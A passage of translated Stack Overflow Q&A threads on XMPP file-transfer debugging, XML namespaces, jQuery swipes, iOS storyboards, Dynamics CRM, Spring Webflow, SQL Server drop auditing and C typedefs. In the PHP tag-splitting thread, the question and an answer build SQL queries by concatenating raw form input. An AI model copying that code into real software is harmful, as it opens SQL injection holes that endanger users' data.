05-15 13:42:04.090: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-11" from="beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/123"><query xmlns="http://jabber.org/protocol/disco#items"><item jid="pubsub.beta.myCompany.co.uk" name="Publish-Subscribe service"/><item jid="broadcast.beta.myCompany.co.uk" name="Broadcast service"/><item jid="search.beta.myCompany.co.uk" name="User Search"/><item jid="conference.beta.myCompany.co.uk" name="Public Chatrooms"/><item jid="proxy.beta.myCompany.co.uk" name="Socks 5 Bytestreams Proxy"/></query></iq>
05-15 13:42:04.100: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-12" to="pubsub.beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/disco#info"></query></iq>
05-15 13:42:04.110: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq id="DK1IO-10" to="myUsername@beta.myCompany.co.uk/123" type="result" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="client" name="Smack" type="pc"/><feature var="http://www.xmpp.org/extensions/xep-0166.html#ns"/><feature var="urn:xmpp:tmp:jingle"/></query></iq>
05-15 13:42:04.130: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-12" from="pubsub.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/123"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="pubsub" name="Publish-Subscribe service" type="service"/><feature var="http://jabber.org/protocol/pubsub"/><feature var="http://jabber.org/protocol/pubsub#collections"/><feature var="http://jabber.org/protocol/pubsub#config-node"/><feature var="http://jabber.org/protocol/pubsub#create-and-configure"/><feature var="http://jabber.org/protocol/pubsub#create-nodes"/><feature var="http://jabber.org/protocol/pubsub#delete-nodes"/><feature var="http://jabber.org/protocol/pubsub#get-pending"/><feature var="http://jabber.org/protocol/pubsub#instant-nodes"/><feature var="http://jabber.org/protocol/pubsub#item-ids"/><feature var="http://jabber.org/protocol/pubsub#meta-data"/><feature var="http://jabber.org/protocol/pubsub#modify-affiliations"/><feature var="http://jabber.org/protocol/pubsub#manage-subscriptions"/><feature var="http://jabber.org/protocol/pubsub#multi-subscribe"/><feature var="http://jabber.org/protocol/pubsub#outcast-affiliation"/><feature var="http://jabber.org/protocol/pubsub#persistent-items"/><feature var="http://jabber.org/protocol/pubsub#presence-notifications"/><feature var="http://jabber.org/protocol/pubsub#publish"/><feature var="http://jabber.org/protocol/pubsub#publisher-affiliation"/><feature var="http://jabber.org/protocol/pubsub#purge-nodes"/><feature var="http://jabber.org/protocol/pubsub#retract-items"/><feature var="http://jabber.org/protocol/pubsub#retrieve-affiliations"/><feature var="http://jabber.org/protocol/pubsub#retrieve-default"/><feature var="http://jabber.org/protocol/pubsub#retrieve-items"/><feature var="http://jabber.org/protocol/pubsub#retrieve-subscriptions"/><feature var="http://jabber.org/protocol/pubsub#subscribe"/><feature var="http://jabber.org/protocol/pubsub#subscription-options"/><feature var="http://jabber.org/protocol/pubsub#default_access_model_open"/><feature var="http://jabber.org/protocol/disco#info"/></query></iq>
05-15 13:42:04.160: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-13" to="broadcast.beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/disco#info"></query></iq>
05-15 13:42:04.170: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-13" from="broadcast.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/123"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="component" type="generic" name="Broadcast service"/><feature var="http://jabber.org/protocol/disco#info"/><feature var="http://jabber.org/protocol/disco#items"/></query></iq>
05-15 13:42:04.190: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-14" to="search.beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/disco#info"></query></iq>
05-15 13:42:04.200: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-14" from="search.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/123"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="directory" type="user" name="User Search"/><feature var="jabber:iq:search"/><feature var="http://jabber.org/protocol/disco#info"/><feature var="http://jabber.org/protocol/rsm"/></query></iq>
05-15 13:42:04.210: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-15" to="conference.beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/disco#info"></query></iq>
05-15 13:42:04.230: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-15" from="conference.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/123"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="conference" name="Public Chatrooms" type="text"/><identity category="directory" name="Public Chatroom Search" type="chatroom"/><feature var="http://jabber.org/protocol/muc"/><feature var="http://jabber.org/protocol/disco#info"/><feature var="http://jabber.org/protocol/disco#items"/><feature var="jabber:iq:search"/><feature var="http://jabber.org/protocol/rsm"/></query></iq>
05-15 13:42:04.240: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-16" to="proxy.beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/disco#info"></query></iq>
05-15 13:42:04.250: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-16" from="proxy.beta.myCompany.co.uk" to="myUsername@beta.t
05-15 13:42:04.250: I/System.out(523): 01:42:04 PM RCV  (1093423288): xttools.co.uk/123"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="proxy" name="SOCKS5 Bytestreams Service" type="bytestreams"/><feature var="http://jabber.org/protocol/bytestreams"/><feature var="http://jabber.org/protocol/disco#info"/></query></iq>
05-15 13:42:04.330: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-17" to="proxy.beta.myCompany.co.uk" type="get"><query xmlns="http://jabber.org/protocol/bytestreams"/></iq>
05-15 13:42:04.341: I/System.out(523): 01:42:04 PM RCV  (1093423288): <iq type="result" id="DK1IO-17" from="proxy.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/123"><query xmlns="http://jabber.org/protocol/bytestreams"><streamhost jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query></iq>
05-15 13:42:04.350: I/System.out(523): 01:42:04 PM SENT (1093423288): <iq id="DK1IO-18" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="set"><query xmlns="http://jabber.org/protocol/bytestreams" sid="jsi_4740809287923906297" mode = "tcp"><streamhost jid="myUsername@beta.myCompany.co.uk/123" host="127.0.0.1" port="7777"/><streamhost jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query></iq>
05-15 13:42:04.400: D/dalvikvm(523): GC_CONCURRENT freed 361K, 5% free 9330K/9799K, paused 5ms+4ms
05-15 13:42:09.412: I/System.out(523): 01:42:09 PM RCV  (1093423288): <iq id="DK1IO-18" to="myUsername@beta.myCompany.co.uk/123" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="error"><query xmlns="http://jabber.org/protocol/bytestreams" sid="jsi_4740809287923906297" mode="tcp"><streamhost jid="myUsername@beta.myCompany.co.uk/123" host="127.0.0.1" port="7777"/><streamhost jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query><error code="404" type="CANCEL"><item-not-found xmlns="urn:ietf:params:xml:ns:xmpp-stanzas"/><text xmlns="urn:ietf:params:xml:ns:xmpp-stanzas" xml:lang="en">Could not establish socket with any provided host</text></error></iq>
05-15 13:42:09.430: I/System.out(523): 01:42:09 PM SENT (1093423288): <iq id="DK1IO-19" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="set"><open xmlns="http://jabber.org/protocol/ibb" block-size="4096" sid="jsi_4740809287923906297" stanza="iq"/></iq>
05-15 13:42:09.451: I/System.out(523): 01:42:09 PM RCV  (1093423288): <iq id="DK1IO-19" to="myUsername@beta.myCompany.co.uk/123" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="result"/>
05-15 13:42:09.470: I/System.out(523): 01:42:09 PM SENT (1093423288): <iq id="DK1IO-20" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="set"><data xmlns="http://jabber.org/protocol/ibb" seq="0" sid="jsi_4740809287923906297">SGVsbG8sIEFuZHkh</data></iq>
05-15 13:42:09.480: I/System.out(523): 01:42:09 PM RCV  (1093423288): <iq id="DK1IO-20" to="myUsername@beta.myCompany.co.uk/123" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="result"/>
05-15 13:42:09.490: I/System.out(523): 01:42:09 PM SENT (1093423288): <iq id="DK1IO-21" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="set"><close xmlns="http://jabber.org/protocol/ibb" sid="jsi_4740809287923906297"/></iq>
05-15 13:42:09.500: I/System.out(523): 01:42:09 PM RCV  (1093423288): <iq id="DK1IO-21" to="myUsername@beta.myCompany.co.uk/123" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="result"/> 
```

**完整日志（iOS 应用）：**

```
2012-05-16 10:41:16.988 JabberClient[392:207] RECIEVED IN APP DELEGATE - <iq xmlns="jabber:client" id="5CCE541D-A2D2-4115-8D0F-A683EE9B18AB" to="myUsername@beta.myCompany.co.uk/844b40b3" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="result"><si xmlns="http://jabber.org/protocol/si"><feature xmlns="http://jabber.org/protocol/feature-neg"><x xmlns="jabber:x:data" type="submit"><field var="stream-method"><value>http://jabber.org/protocol/bytestreams</value></field></x></feature></si></iq>
2012-05-16 10:41:16.989 JabberClient[392:207] Attempting XEP65 connection to friendsUsername@beta.myCompany.co.uk/Spark 2.6.3
2012-05-16 10:41:16.990 JabberClient[392:207] TURNSocket DELEGATE STARTING
2012-05-16 10:41:16.991 JabberClient[392:5307] SENT - <iq type="get" to="beta.myCompany.co.uk" id="24C8A655-1B23-4E49-B0D2-557B863C6EB4"><query xmlns="http://jabber.org/protocol/disco#items"/></iq>
2012-05-16 10:41:16.999 JabberClient[392:5307] RECIEVED IN TURN SOCKET - <iq xmlns="jabber:client" type="result" id="24C8A655-1B23-4E49-B0D2-557B863C6EB4" from="beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/844b40b3"><query xmlns="http://jabber.org/protocol/disco#items"><item jid="pubsub.beta.myCompany.co.uk" name="Publish-Subscribe service"/><item jid="broadcast.beta.myCompany.co.uk" name="Broadcast service"/><item jid="search.beta.myCompany.co.uk" name="User Search"/><item jid="conference.beta.myCompany.co.uk" name="Public Chatrooms"/><item jid="proxy.beta.myCompany.co.uk" name="Socks 5 Bytestreams Proxy"/></query></iq>
2012-05-16 10:41:17.000 JabberClient[392:5307] SENT - <iq type="get" to="proxy.beta.myCompany.co.uk" id="A8D03520-2200-4260-A150-910BC70F794A"><query xmlns="http://jabber.org/protocol/disco#info"/></iq>
2012-05-16 10:41:17.004 JabberClient[392:5007] RECIEVED IN TURN SOCKET - <iq xmlns="jabber:client" type="result" id="A8D03520-2200-4260-A150-910BC70F794A" from="proxy.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/844b40b3"><query xmlns="http://jabber.org/protocol/disco#info"><identity category="proxy" name="SOCKS5 Bytestreams Service" type="bytestreams"/><feature var="http://jabber.org/protocol/bytestreams"/><feature var="http://jabber.org/protocol/disco#info"/></query></iq>
2012-05-16 10:41:17.005 JabberClient[392:5007] SENT - <iq type="get" to="proxy.beta.myCompany.co.uk" id="50A73193-944D-402D-B2E4-EEACC537B23B"><query xmlns="http://jabber.org/protocol/bytestreams"/></iq>
2012-05-16 10:41:17.008 JabberClient[392:5007] RECIEVED IN TURNSOCKET - <iq xmlns="jabber:client" type="result" id="50A73193-944D-402D-B2E4-EEACC537B23B" from="proxy.beta.myCompany.co.uk" to="myUsername@beta.myCompany.co.uk/844b40b3"><query xmlns="http://jabber.org/protocol/bytestreams"><streamhost jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query></iq>
2012-05-16 10:41:17.009 JabberClient[392:5007] SENT - <iq type="set" from="myUsername@beta.myCompany.co.uk/844b40b3" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" id="5CCE541D-A2D2-4115-8D0F-A683EE9B18AB"><query xmlns="http://jabber.org/protocol/bytestreams" sid="5CCE541D-A2D2-4115-8D0F-A683EE9B18AB" mode="tcp"><streamhost xmlns="http://jabber.org/protocol/bytestreams" jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query></iq>
2012-05-16 10:41:27.027 JabberClient[392:540b] RECIEVED IN TURN SOCKET - <iq xmlns="jabber:client" id="5CCE541D-A2D2-4115-8D0F-A683EE9B18AB" to="myUsername@beta.myCompany.co.uk/844b40b3" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="error"><query xmlns="http://jabber.org/protocol/bytestreams" sid="5CCE541D-A2D2-4115-8D0F-A683EE9B18AB" mode="tcp"><streamhost jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query><error code="404" type="CANCEL"><item-not-found xmlns="urn:ietf:params:xml:ns:xmpp-stanzas"/><text xmlns="urn:ietf:params:xml:ns:xmpp-stanzas" lang="en">Could not establish socket with any provided host</text></error></iq>
2012-05-16 10:41:27.028 JabberClient[392:540b] TURN Connection failed! 
```

**OpenFire XMPP 设置 -**

```
xmpp.auth.anonymous - true
xmpp.client.compression.policy - disabled
xmpp.client.idle -1
xmpp.client.idle.ping - false
xmpp.domain - beta.myCompany.co.uk
xmpp.enabled - true
xmpp.externalip - proxy.beta.myCompany.co.uk
xmpp.offline.quota - 102400
xmpp.offline.type - bounce
xmpp.proxy.enabled - true
xmpp.proxy.port - 7777
xmpp.proxy.transfer.required - true
xmpp.server.compression.policy - disabled
xmpp.server.socket.active - true
xmpp.session.conflict-limit - 0
xmpp.session.conflict.limit - 0
xmpp.socket.ssl.active - true 
```

**5 月 19 日更新：**以下是 Spark 成功发送*到*android 的一些日志（反之亦然）。使用的流主机不是代理！但是，我还没有设法在 iOS 上复制它，我真的应该这样做吗？代理不应该工作吗？

```
RCV  (1079219752): <iq id="ktI51-43" to="myUsername@beta.myCompany.co.uk/123" type="set" from="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3"><query xmlns="http://jabber.org/protocol/bytestreams" sid="jsi_1985730781887292843" mode="tcp"><streamhost jid="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" host="10.95.xxx.xx" port="7777"/><streamhost jid="proxy.beta.myCompany.co.uk" host="127.0.1.1" port="7777"/></query></iq>
SENT (1079219752): <iq id="ktI51-43" to="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" type="result"><query xmlns="http://jabber.org/protocol/bytestreams"><streamhost-used jid="friendsUsername@beta.myCompany.co.uk/Spark 2.6.3" /></query></iq> 
```

请注意，如果我尝试从 Spark 发送到我的 iOS 应用程序，当使用非代理流主机时，连接被拒绝！（如本[SOCKS 协议第 5 版](http://www.ietf.org/rfc/rfc1928.txt)文档的第 6 点）。以下代码中的 Rep 为 5，（但应该为 0）。

```
UInt8 ver = [NSNumber extractUInt8FromData:data atOffset:0];
UInt8 rep = [NSNumber extractUInt8FromData:data atOffset:1]; 
```

**主机文件：（**注意：对于这个 stackoverflow 问题，我已经用 x 替换了一些数字）

```
127.0.0.1       localhost
10.95.xxx.xxx   intranet.myCompany.co.uk
255.255.255.255 broadcasthost
::1             localhost
fe80::1%lo0     localhost
10.95.xxx.xxx   beta.myCompany.co.uk 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T10:27:06.100

我的 OpenFire 属性设置错误。'xmpp.externalip' 是错误的。我需要使用'xmpp.proxy.enabledip'并将其设置为公共IP。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-07T22:26:56.140

看起来您的服务器正在报告 127.0.0.1 或 localhost 的蒸汽主机（代理），这是不正确的。

我最近在有人配置 /etc/hosts 以将服务器名称指向 127.0.0.1 的 openfire 服务器上看到了这一点，因此当它查找自己的名称时它会向客户端报告。

检查这一点的最简单方法是“ping”和“ping”，并查看它提供的 IP 地址。

例如，如果您的服务器名称是 beta.myCompany.co.uk，您可以尝试（登录到服务器时）：

ping beta ping beta.myCompany.co.uk

如果任一返回 IP 为 127.0.0.1，请检查 /etc/hosts（或 C:\Windows\System32\drivers\etc\hosts 如果在 Windows 上）并确保 beta 和 beta.myCompany.co.uk 不存在（或有适当的数据（如果有）。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-07T07:15:49.703

是的，文件传输会出现这个错误。不要使用编译库使用 smack for android 的源代码 amack/smack 它将帮助您跟踪错误。我确实使用了源代码。

[https://github.com/rtreffer/smack/blob/master/source/org/jivesoftware/smack/XMPPConnection.java](https://github.com/rtreffer/smack/blob/master/source/org/jivesoftware/smack/XMPPConnection.java)

# web-services - SOAP 协议中的 type="xs:string" 或 type="xsd:string"

> ID：10603155
> 
> 赞同：8
> 
> 时间：2012-05-15T14:41:56.630
> 
> 标签：web-services, soap, message, xml-namespaces

我是 Web 服务世界的新手，我在不同的教程中看到，其中一些`xs:string`用于数据类型，一些`xsd:string`用于 w3schools.com 中的消息，如下所示：

```
<message name="getTermResponse">
  <part name="value" type="xs:string"/>
</message> 
```

例如在 Apress 开始 PHP 和 MySQL 中，代码如下：

```
<message name="getTermResponse">
  <part name="value" type="xsd:string"/>
</message> 
```

它们之间有什么区别？什么时候用？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-15T14:47:26.570

`xs:string`是 XML 中限定名称的示例。该`xs`部分指的是同一元素或父元素上的命名空间声明。最有可能的是，有一个`xmlns:xs=http://www.w3.org/2001/XMLSchema`声明。

`xsd:string`是完全一样的，假设声明是`xmlns:xsd=http://www.w3.org/2001/XMLSchema`. `foo:string`如果声明是 . 也是一样的`xmlns:foo=http://www.w3.org/2001/XMLSchema`。

换句话说，前缀无关紧要。它是命名空间的别名。如果命名空间相同，并且本地名称相同，则两个限定名称相同。

# jquery - 使用 jQuery 检测 iPhone 滑动

> ID：10603157
> 
> 赞同：8
> 
> 时间：2012-05-15T14:42:01.700
> 
> 标签：jquery, iphone, function, touch, swipe

我只是在寻找一个能够检测到手指在触摸设备上滑动的侦听器。

例如;

```
 if (swipe.direction == 'left' ) {
     function();
 } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:45:09.843

你可以使用这个 jquery 插件

[http://www.netcu.de/jquery-touchwipe-iphone-ipad-library](http://www.netcu.de/jquery-touchwipe-iphone-ipad-library)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T14:46:49.967

使用 jQueryMobile，您可以使用多个事件，例如`swipe`, 甚至`swipeleft`, `swiperight`,`tap`等。

[http://jquerymobile.com/test/docs/api/events.html](http://jquerymobile.com/test/docs/api/events.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-11-25T12:40:49.943

一个更好的处理滑动的插件（如果这就是你想要的）是 Touch Swipe。

我发现 touchwipe 很垃圾，当你想要的只是这个功能时，我总是觉得 jQueryMobile 很重。

[https://github.com/mattbryson/TouchSwipe-Jquery-Plugin](https://github.com/mattbryson/TouchSwipe-Jquery-Plugin)

# ios - 使用情节提要的 iOS 主从应用程序

> ID：10603163
> 
> 赞同：2
> 
> 时间：2012-05-15T14:42:17.113
> 
> 标签：ios, uitableview, uistoryboard

必须在这里遗漏一些非常明显的东西，但是如何更改使用 Master-Detail 模板时创建的表视图的大小。

如果我在文档大纲中选择表格视图，然后查看大小检查器，则视图高度显示为灰色。

我想做的是在窗口中间有一个较小的表格视图。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-08T11:06:38.500

您需要将 MasterViewController 重新创建为 UIViewController 而不是 UITableViewController，并将（较小的）表视图添加为情节提要的 MasterViewController 中的视图。不要忘记在新的 MasterViewController 类中采用 UITableViewDataSource 和 UITableViewDelegate 协议。

# dynamics-crm-2011 - 在事务中查找记录

> ID：10603165
> 
> 赞同：1
> 
> 时间：2012-05-15T14:42:20.740
> 
> 标签：dynamics-crm-2011

我已经修改了一个报价，CRM2011 创建一个新的报价，复制产品并更新修订。我有一个与此报价相关的自定义实体。我需要 QuoteDetails 中的quotedetailid 来更新这个相关实体。

在报价的后期创建中，我检查了 ParentContext 中的消息“Revise”。找到后，我检索相关实体。我遍历这些实体，试图找到 QuoteDetail。未找到 QuoteDetail。

修改完成后，QuoteDetails 变为可用。

建议任何人？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T05:25:38.877

确保插件在“异步执行模式”的“子管道”中的“引用”实体上注册为“后操作”。

# php - 拆分标签并将它们提交到数据库

> ID：10603171
> 
> 赞同：0
> 
> 时间：2012-05-15T14:42:39.403
> 
> 标签：php, javascript, sql, database, tags

我正在尝试创建一个 javascript 来拆分标签（用户提供的标签，用逗号（，）分隔它们）并将它们以不同的行但具有相同的 id 传递到我的数据库中。我有这个代码：

```
<form name="formatform" method="post" onsubmit="return validate_format_form()" action="formatsubmit.php">
<p>
Συντομος Τιτλος:<input type="text" name="titlos" value="">
Συντομη περιγραφη:<input type="text" name="perigrafi" value="">
</p>
<p>
Τοποθεσια:<input type="text" id="loc" name="topothesia" value="">
Tags:<input type="text" name="tags" value="">
**Οι ετικέτες πρέπει να χωρίζονται με κόμμα
</p>
.
.
.
</form> 
```

并在 formatsubmit.php 中将这些代码传递到数据库中：

```
$query= " INSERT into photos(`title`,`description`,`location`,`privilages`,`ph_tags`) VALUES ('".$_POST['titlos']."','".$_POST['perigrafi']."','".$_POST['topothesia']."','".$_POST['radio_check']."','".$_POST['tags']."') ";
$result= mysql_query($query,$con); 
```

如果用户提供 3 个标签（用逗号分隔），我想将它们拆分并将它们传递给不同行的数据库。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:52:48.170

如何使用逗号作为分隔符将标签输入拆分为一个数组，然后遍历标签并为每个标签创建一个插入语句？例如

```
$tag_array = explode(",", $_POST['tags']);
foreach ($tag_array as $tag) {
  $query= " INSERT into photos(`title`,`description`,`location`,`privilages`,`ph_tags`) VALUES ('".$_POST['titlos']."','".$_POST['perigrafi']."','".$_POST['topothesia']."','".$_POST['radio_check']."','".$tag."') ";
  $result= mysql_query($query,$con);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:48:59.570

如果你想用 PHP 来做，请使用`explode(",", $input);`. 要在 JavaScript 中执行此操作，请执行`input=input.split(",")`. 然后，您将拥有一组可以按编号引用的标签（例如`$input[0]...$input[x]`(PHP) 或`input[0]...input[x]`(JavaScript)）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:03:12.267

您还应该处理用户输入，因为您将获得输入双标签的用户，`,,`从而使explode具有空值`POST`，并且像这样使用您将进行sql注入：

```
<?php 
function get_tags($tags){
    $ret=array();
    $tags=explode(',',strtolower($tags));
    foreach($tags as $tag){
        if($tag==''){}else{
            $ret[]=ucfirst(trim($tag));
        }
    }
    return $ret;
}

function insert_photo_tags($tags){
    array_walk($_POST,'mysql_real_escape_string');
    foreach ($tags as $tag) {
        $query = " INSERT INTO photos(`title`,`description`,`location`,`privilages`,`ph_tags`) 
                   VALUES ('".$_POST['titlos']."','".$_POST['perigrafi']."','".$_POST['topothesia']."','".$_POST['radio_check']."','".$tag."') ";
        mysql_query($query);
    }
}

//Test Input (?tags=php,mySQL,http,bLa,,,,,,123)

$tags = get_tags(mysql_real_escape_string($_POST['tags']));

//Do your insert with the array
insert_photo_tags($tags);

print_r($tags);
/*
Array
(
[0] => Php
[1] => Mysql
[2] => Http
[3] => Bla
[4] => 123
)
*/
?> 
```

# ajax - Ajax + Spring Webflow

> ID：10603177
> 
> 赞同：8
> 
> 时间：2012-05-15T14:43:01.493
> 
> 标签：ajax, spring-webflow

首先，我使用 spring webflow 和一些 spring javascript 来简化 ajax 调用。

截至目前，我正在让 ajax 调用 webflow 以显示适当的片段。

所以我试图使用 Spring.AjaxEventDecoration 来满足我的应用程序的 ajax 需求。但是，我在使用这种方法和 webflow 时遇到了一些问题，据我所知，可以使用的示例很少。

附带说明一下，我没有使用表单或选择框。我想我会提到这一点，因为我发现的每个示例都使用了带有 onlick 事件的表单/表单提交或带有 onchange 事件的选择框。

**主要问题**：如果我的 webflow 中有一个方法具有来自我的 ajax 的参数，我实际上可以将参数从 ajax 传递到 webflow 吗？

代码：

```
<transition on="disassociateProperty" >
     <evaluate expression="dService.disassociateProperty(requestParameters.currentPId ,currentD)"  result="flowScope.currentD" />
<render fragments="PList" />
</transition> 
```

因此，当我查看 firebug 中的 ajax 调用时，它具有我传入的参数 (currentPId) 和正确的 eventId。

我在 disassociateProperty 方法的第一行放置了一个调试点，它告诉我 currentPId 为空。

所以我会假设 webflow 中的 requestParameters.currentPId 没有从 ajax 调用中提取 currentPId。

这是预期的吗？谁能解释一下并举个例子？

我将不胜感激提供的任何帮助。

亚当

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-02T14:27:57.517

如果您认为问题来自 ajax 调用，那么在此处编写 ajax 调用会很有帮助，这样我们就可以检查调用是否正确完成。

在进行 ajax 调用时，您可以尝试传递在 data 参数中**序列化的表单。**另外，不要忘记在 URL 中添加**ajaxSource**参数。希望这有帮助。

HTML 示例：

```
<form id="formId" method="post" action="${flowExecutionUrl}&_eventId=disassociateProperty">
    <input type="text" id="currentPId" />
</form> 
```

jQuery 示例：

```
$.ajax({
        type: "POST",
        data: $("#formId").serialize(),
        url: $("#formId").attr("action") + "&ajaxSource=true",
        ...
}); 
```

# sql-server - 检查在 SQL Server 上运行了哪些“DROP”查询

> ID：10603178
> 
> 赞同：3
> 
> 时间：2012-05-15T14:43:02.013
> 
> 标签：sql-server, sql-drop

一旦我获得访问服务器的权限，有些人就会在我们的一个数据库中不断删除表。我不知道这个人是谁。因为这个人，我曾经差点丢了工作。

所以我想知道有没有一种方法可以检查哪个用户运行了查询，`DROP TABLE my_table`以便我可以向我的老板证明我是无辜的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:50:09.673

我发现这篇[文章](http://www.sqlskills.com/BLOGS/PAUL/post/Finding-out-who-dropped-a-table-using-the-transaction-log.aspx)可能对你有所帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:08:24.213

在 SQL Server 2005 或更高版本上，您还可以调查[DDL 触发器](http://msdn.microsoft.com/en-us/library/ms190989%28v=sql.90%29.aspx)，它甚至可以让您禁止某些`DROP TABLE`语句......

```
CREATE TRIGGER safety 
ON DATABASE 
FOR DROP_TABLE
AS 
   PRINT 'You must disable Trigger "safety" to drop tables!' 
   ROLLBACK
; 
```

这基本上只是防止任何人丢弃一张桌子

# c - 我不明白为什么编译器给我这段代码错误

> ID：10603182
> 
> 赞同：10
> 
> 时间：2012-05-15T14:43:22.220
> 
> 标签：c, linux, gcc, clang, x86-64

我有以下 C 代码，对我来说看起来非常正确。然而，clang 编译器（事实上 gcc 或任何其他 C 编译器也是）不这么认为。

```
typedef struct
{
    struct timeval td_start;
    struct timeval td_end;
} Timer;

void startTimer( struct Timer* ptimer ) 
{
    gettimeofday( &(ptimer->td_start), NULL );
}

void stopTimer( struct Timer* ptimer ) 
{
    gettimeofday( &(ptimer->td_end), NULL );
} 
```

编译器给出以下警告和错误消息。知道这里有什么问题吗？

```
./timing.h:14:25: warning: declaration of 'struct Timer' will not be visible
      outside of this function [-Wvisibility]
void startTimer( struct Timer* ptimer )
                        ^
./timing.h:16:27: error: incomplete definition of type 'struct Timer'
    gettimeofday( &(ptimer->td_start), NULL );
                    ~~~~~~^
./timing.h:14:25: note: forward declaration of 'struct Timer'
void startTimer( struct Timer* ptimer )
                        ^
./timing.h:19:24: warning: declaration of 'struct Timer' will not be visible
      outside of this function [-Wvisibility]
void stopTimer( struct Timer* ptimer )
                       ^
./timing.h:21:27: error: incomplete definition of type 'struct Timer'
    gettimeofday( &(ptimer->td_end), NULL );
                    ~~~~~~^
./timing.h:19:24: note: forward declaration of 'struct Timer'
void stopTimer( struct Timer* ptimer ) 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-15T14:44:42.353

删除`struct`关键字（不需要，因为您已经`typedef`编辑了结构）：

```
void startTimer( Timer* ptimer ) 
{
  ...

void stopTimer( Timer* ptimer ) 
{
  ... 
```

或者，删除`typedef`：

```
struct Timer
{
    struct timeval td_start;
    struct timeval td_end;
};

void startTimer( struct Timer* ptimer ) 
{
  ...

void stopTimer( struct Timer* ptimer ) 
{
  ... 
```

有关更多信息，请参阅[为什么我们应该在 C 中如此频繁地对结构进行类型定义？](https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T14:45:38.593

无论是你

```
struct Timer
{
    struct timeval td_start;
    struct timeval td_end;
};

void startTimer( struct Timer* ptimer ) 
{
    gettimeofday( &(ptimer->td_start), NULL );
} 
```

或者您

```
typedef struct
{
    struct timeval td_start;
    struct timeval td_end;
} Timer;

void startTimer( Timer* ptimer ) 
{
    gettimeofday( &(ptimer->td_start), NULL );
} 
```

但不要混淆。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-15T14:45:42.383

你创建了一个名为 Timer 的类型，只需删除函数参数前的 struct 一词，如下所示，例如：

```
void startTimer( Timer* ptimer ) 
{
    gettimeofday( &(ptimer->td_start), NULL );
} 
```

* * *

## 回答 #4

> 赞同：2
> 
